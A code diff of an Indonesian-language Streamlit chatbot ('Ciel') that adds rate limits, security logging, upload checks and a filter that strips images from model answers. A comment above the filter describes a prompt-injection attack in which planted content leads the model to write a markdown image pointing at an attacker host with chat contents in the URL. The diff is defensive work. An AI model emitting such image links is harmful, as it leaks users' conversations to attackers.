@@ -1047,11 +1047,15 @@ ML_ANALYST_ID = get_config("ML_ANALYST_ID") or "CielMLAnalyst-m7Lq2"
 # dataset itu.
 DATASET_STORE_ID = get_config("DATASET_STORE_ID") or "CielDatasetStore-d4tA5"
 
-# Batas pesan per jam untuk menjaga biaya model dan beban backend.
-# Batas total anonim mencegah orang melewati batas dengan memuat ulang tab.
-RATE_LIMIT_PER_HOUR = get_int_config("RATE_LIMIT_PER_HOUR", 20)
+# Batas pesan per jam dan per hari untuk menjaga biaya model dan beban backend.
+# Batas total anonim mencegah orang melewati batas dengan memuat ulang tab;
+# batas total harian semua pengguna adalah rem darurat untuk tagihan API.
+RATE_LIMIT_PER_HOUR = get_int_config("RATE_LIMIT_PER_HOUR", 10)
 RATE_LIMIT_PER_HOUR_LOGIN = get_int_config("RATE_LIMIT_PER_HOUR_LOGIN", 60)
-RATE_LIMIT_ANON_TOTAL_PER_HOUR = get_int_config("RATE_LIMIT_ANON_TOTAL_PER_HOUR", 150)
+RATE_LIMIT_PER_DAY_LOGIN = get_int_config("RATE_LIMIT_PER_DAY_LOGIN", 300)
+RATE_LIMIT_ANON_TOTAL_PER_HOUR = get_int_config("RATE_LIMIT_ANON_TOTAL_PER_HOUR", 60)
+RATE_LIMIT_ANON_TOTAL_PER_DAY = get_int_config("RATE_LIMIT_ANON_TOTAL_PER_DAY", 300)
+RATE_LIMIT_TOTAL_PER_DAY = get_int_config("RATE_LIMIT_TOTAL_PER_DAY", 1500)
 
 AUTH_ENABLED = auth_configured()
 
@@ -1263,25 +1267,42 @@ class CielError(str):
 
 
 # ============================================================
+# SECURITY LOG
+# ============================================================
+
+def security_event(kind, **fields):
+    """Satu format log untuk kejadian keamanan, mudah dicari di log Streamlit Cloud."""
+    details = "".join(f" {key}={value}" for key, value in fields.items())
+    logger.warning("security_event kind=%s%s", kind, details)
+
+
+# ============================================================
 # RATE LIMIT
 # ============================================================
 
-def rate_limit_ok(store, limits, now, window=3600):
+HOUR = 3600
+DAY = 24 * HOUR
+
+
+def rate_limit_full(store, limits, now):
     """
-    Catat satu request jika semua key di `limits` ({key: batas}) masih di
-    bawah batasnya dalam `window` detik terakhir. Tidak mencatat apa pun
-    jika salah satu batas sudah tercapai.
+    `limits` adalah {key: (batas, jendela_detik)}. Jika semua key masih di
+    bawah batasnya, catat satu request di setiap key dan kembalikan None.
+    Jika tidak, jangan catat apa pun dan kembalikan key pertama yang penuh.
     """
     recent = {
         key: [t for t in store.get(key, ()) if now - t < window]
-        for key in limits
+        for key, (_, window) in limits.items()
     }
 
-    allowed = all(len(recent[key]) < limit for key, limit in limits.items())
+    full = next(
+        (key for key, (limit, _) in limits.items() if len(recent[key]) >= limit),
+        None,
+    )
 
     for key, times in recent.items():
 
-        if allowed:
+        if full is None:
             times.append(now)
 
         if times:
@@ -1289,7 +1310,7 @@ def rate_limit_ok(store, limits, now, window=3600):
         else:
             store.pop(key, None)
 
-    return allowed
+    return full
 
 
 @st.cache_resource
@@ -1298,40 +1319,70 @@ def rate_limit_state():
     return {"lock": threading.Lock(), "hits": {}}
 
 
-def check_rate_limit():
-    """Kembalikan None jika boleh lanjut, atau pesan error ber-marker ⏳."""
+def rate_limits_for_request():
+    """{key: (batas, jendela)} untuk pengirim pesan ini, plus batas harian semua pengguna."""
 
     if logged_in():
-        limit = RATE_LIMIT_PER_HOUR_LOGIN
-        limits = {f"user:{user_key()}": limit}
-    else:
-        limit = RATE_LIMIT_PER_HOUR
         limits = {
-            f"visitor:{user_key()}": limit,
-            "anon:total": RATE_LIMIT_ANON_TOTAL_PER_HOUR,
+            f"user:{user_key()}:hour": (RATE_LIMIT_PER_HOUR_LOGIN, HOUR),
+            f"user:{user_key()}:day": (RATE_LIMIT_PER_DAY_LOGIN, DAY),
+        }
+    else:
+        limits = {
+            f"visitor:{user_key()}:hour": (RATE_LIMIT_PER_HOUR, HOUR),
+            "anon:total:hour": (RATE_LIMIT_ANON_TOTAL_PER_HOUR, HOUR),
+            "anon:total:day": (RATE_LIMIT_ANON_TOTAL_PER_DAY, DAY),
         }
 
+    limits["all:total:day"] = (RATE_LIMIT_TOTAL_PER_DAY, DAY)
+
+    return limits
+
+
+def rate_limit_message(key, limit):
+    """Penjelasan untuk batas yang tercapai (key dari rate_limits_for_request)."""
+
+    period = "jam" if key.endswith(":hour") else "hari"
+
+    if key.startswith("user:"):
+        return f"Ciel menerima hingga {limit} pesan per {period} per akun. Silakan coba lagi nanti."
+
+    if key.startswith("visitor:"):
+        return f"Tanpa login, Ciel menerima hingga {limit} pesan per jam. Silakan coba lagi nanti."
+
+    if key.startswith("anon:"):
+        return (
+            f"Kuota bersama untuk semua pengguna tanpa login ({limit} pesan per {period}) "
+            "sedang habis. Silakan coba lagi nanti."
+        )
+
+    return "Ciel sedang menerima terlalu banyak pesan hari ini. Silakan coba lagi besok."
+
+
+def check_rate_limit():
+    """Kembalikan None jika boleh lanjut, atau CielError yang menyebut batas yang tercapai."""
+
+    limits = rate_limits_for_request()
     state = rate_limit_state()
 
     with state["lock"]:
-        allowed = rate_limit_ok(state["hits"], limits, time.time())
+        full = rate_limit_full(state["hits"], limits, time.time())
 
-    if allowed:
+    if full is None:
         return None
 
-    logger.warning("rate_limited logged_in=%s", logged_in())
+    scope = full.split(":")[0]
+    security_event("rate_limited", scope=scope, period=full.rsplit(":", 1)[-1], logged_in=logged_in())
 
     hint = (
         " Masuk dengan akun Google untuk batas yang lebih tinggi."
-        if AUTH_ENABLED and not logged_in()
+        if AUTH_ENABLED and scope in ("visitor", "anon")
         else ""
     )
 
     return CielError(
-        "Batas pesan per jam tercapai.\n\n"
-        f"Ciel menerima hingga {limit} pesan per jam per pengguna, dan "
-        "pemakaian tanpa login juga dibatasi bersama. Silakan coba lagi nanti."
-        f"{hint}"
+        "Batas pesan tercapai.\n\n"
+        f"{rate_limit_message(full, limits[full][0])}{hint}"
     )
 
 
@@ -1364,6 +1415,23 @@ def final_answer_text(message):
         return texts[-1]
 
     return message["data"]["text"]
+
+
+# Gambar markdown dimuat browser tanpa diklik. Prompt injection (halaman web,
+# file, foto) bisa menyuruh model menulis ![](https://penyerang/?d=<isi chat>),
+# jadi jawaban tidak pernah menampilkan gambar dari luar.
+MARKDOWN_IMAGE = re.compile(
+    r"!\[[^\]]*\]"                              # ![alt]
+    r"(?:\((?:[^()]|\([^()]*\))*\)|\[[^\]]*\])?"  # (url "judul") atau [ref], atau tanpa keduanya
+    r"|<img\b[^>]*>",
+    re.IGNORECASE,
+)
+IMAGE_REMOVED = "[gambar dihapus]"
+
+
+def strip_markdown_images(text):
+    """Ganti setiap gambar markdown/HTML dengan penanda. Kembalikan (teks, jumlah)."""
+    return MARKDOWN_IMAGE.subn(IMAGE_REMOVED, str(text))
 
 
 def ask_langflow(message, tweaks=None, session_id=None):
@@ -1440,6 +1508,11 @@ def ask_langflow(message, tweaks=None, session_id=None):
                 ["outputs"][0]
                 ["results"]["message"]
             )
+
+            answer, removed = strip_markdown_images(answer)
+
+            if removed:
+                security_event("answer_image_removed", id=request_id, count=removed)
 
             logger.info(
                 "request_success id=%s elapsed=%.2fs output_length=%d",
@@ -2035,11 +2108,16 @@ IMAGE_MIME = {
 }
 MAX_IMAGES_PER_MESSAGE = 4
 MAX_IMAGE_BYTES = 5 * 1024 * 1024
+# Dicek dari header sebelum gambar didekode: PNG 5 MB bisa berisi gambar
+# raksasa (decompression bomb) yang menghabiskan memori server.
+MAX_IMAGE_PIXELS = 90_000_000
 # The vision model reads a 1024 px photo as well as the original; a phone photo
 # (~3000x4000) needed 4283 tokens and failed the model's 4096-token context.
 VISION_IMAGE_PX = 1024
 THUMBNAIL_PX = 360
 MAX_FILES_PER_MESSAGE = 5
+# Teks yang diketik; teks panjang bisa dilampirkan sebagai file (MAX_FILE_CHARS).
+MAX_MESSAGE_CHARS = 10_000
 MAX_FILE_CHARS = 40_000
 # Batas kerja ekstraksi PDF: berhenti setelah sekian halaman meski teksnya
 # belum mencapai MAX_FILE_CHARS (mis. ratusan halaman gambar tanpa teks).
@@ -2332,17 +2410,42 @@ def read_image(uploaded):
             f"{MAX_IMAGE_BYTES // (1024 * 1024)} MB."
         )
 
-    return fit_for_vision({
+    unreadable = f"{uploaded.name}: file ini bukan gambar yang bisa dibaca."
+
+    try:
+        with Image.open(io.BytesIO(raw)) as img:
+            pixels = img.width * img.height
+    except Image.DecompressionBombError:
+        pixels = MAX_IMAGE_PIXELS + 1
+    except Exception:
+        security_event("image_rejected", reason="unreadable")
+        return None, unreadable
+
+    if pixels > MAX_IMAGE_PIXELS:
+        security_event("image_rejected", reason="pixels")
+        return None, (
+            f"{uploaded.name}: resolusi gambar terlalu besar "
+            f"(maks. {MAX_IMAGE_PIXELS // 1_000_000} megapiksel)."
+        )
+
+    image = fit_for_vision({
         "name": uploaded.name,
         "data": raw,
         "mime": IMAGE_MIME.get(file_extension(uploaded.name), "image/png"),
-    }), None
+    })
+
+    if image is None:
+        security_event("image_rejected", reason="unreadable")
+        return None, unreadable
+
+    return image, None
 
 
 def fit_for_vision(image):
     """
     Upright the photo (EXIF orientation) and shrink it to VISION_IMAGE_PX on
-    the longest side. Small upright images and unreadable files are sent as is.
+    the longest side. Small upright images are sent as is; None when the file
+    cannot be decoded, so a broken or hostile file never reaches the backend.
     """
     try:
         with Image.open(io.BytesIO(image["data"])) as img:
@@ -2358,7 +2461,7 @@ def fit_for_vision(image):
             out = io.BytesIO()
             upright.convert("RGB").save(out, format="JPEG", quality=88)
     except Exception:
-        return image
+        return None
 
     stem = str(image["name"]).rsplit(".", 1)[0]
     return {"name": f"{stem}.jpg", "data": out.getvalue(), "mime": "image/jpeg"}
@@ -3321,13 +3424,22 @@ chat_value = st.chat_input(
     "Tanyakan sesuatu kepada Ciel...",
     accept_file="multiple",
     file_type=ALLOWED_FILE_TYPES + ALLOWED_IMAGE_TYPES,
+    max_chars=MAX_MESSAGE_CHARS,
 )
 
 if chat_value:
 
     typed_text, typed_files = unpack_chat_input(chat_value)
 
-    if typed_text.strip() or typed_files:
+    # max_chars hanya dicek di browser; permintaan buatan sendiri bisa melewatinya.
+    if len(typed_text) > MAX_MESSAGE_CHARS:
+        security_event("message_too_long", length=len(typed_text))
+        st.toast(
+            "Pesan terlalu panjang (maks. 10.000 karakter). Lampirkan teks panjang sebagai file.",
+            icon=":material/error:",
+        )
+
+    elif typed_text.strip() or typed_files:
         st.session_state.pending = make_pending(typed_text, typed_files)
 
 pending_request = st.session_state.pending
@@ -3399,8 +3511,9 @@ for index, message in enumerate(messages):
 
         else:
 
+            # Riwayat lama (Supabase) dibersihkan lagi saat ditampilkan.
             st.markdown(
-                message["content"]
+                strip_markdown_images(message["content"])[0]
             )
 
 
